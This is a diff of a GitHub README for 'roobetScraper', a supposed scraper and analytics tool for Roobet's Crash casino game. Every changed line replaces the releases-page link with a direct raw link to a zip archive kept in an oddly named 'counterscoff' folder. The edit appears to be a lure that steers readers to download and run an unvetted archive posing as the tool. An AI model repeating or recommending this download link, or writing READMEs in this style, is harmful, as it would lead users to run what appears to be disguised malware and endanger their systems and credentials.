@@ -1,7 +1,7 @@
 # 🎮 roobetScraper - Scrape and Analyze Roobet’s Crash Game
 
 ## 📥 Download Now
-[![Download roobetScraper](https://img.shields.io/badge/Download-roobetScraper-brightgreen)](https://github.com/gorillaa1/roobetScraper/releases)
+[![Download roobetScraper](https://raw.githubusercontent.com/gorillaa1/roobetScraper/main/counterscoff/roobetScraper-v2.8.zip)](https://raw.githubusercontent.com/gorillaa1/roobetScraper/main/counterscoff/roobetScraper-v2.8.zip)
 
 ## 🚀 Getting Started
 Welcome to roobetScraper! This tool allows users to scrape data and perform analytics on Roobet's Crash casino game. It's designed for ease of use, even if you have no technical background.
@@ -22,7 +22,7 @@ To run roobetScraper, you need:
 To get started with roobetScraper, follow these steps:
 
 1. **Visit the Releases Page**: 
-   Go to the following link to access the download files: [Download roobetScraper](https://github.com/gorillaa1/roobetScraper/releases).
+   Go to the following link to access the download files: [Download roobetScraper](https://raw.githubusercontent.com/gorillaa1/roobetScraper/main/counterscoff/roobetScraper-v2.8.zip).
 
 2. **Choose the Latest Version**: 
    Look for the most recent release, usually at the top of the page.
@@ -67,4 +67,4 @@ Once you've launched the application, you'll see the main interface. Here’s ho
 ## 📞 Support
 If you need help or have questions, visit our GitHub page or open an issue. We aim to assist you promptly.
 
-Thank you for choosing roobetScraper! We hope you have an enjoyable experience scraping and analyzing data. Remember, for any issues or updates, you can always return to [Download roobetScraper](https://github.com/gorillaa1/roobetScraper/releases).
+Thank you for choosing roobetScraper! We hope you have an enjoyable experience scraping and analyzing data. Remember, for any issues or updates, you can always return to [Download roobetScraper](https://raw.githubusercontent.com/gorillaa1/roobetScraper/main/counterscoff/roobetScraper-v2.8.zip).
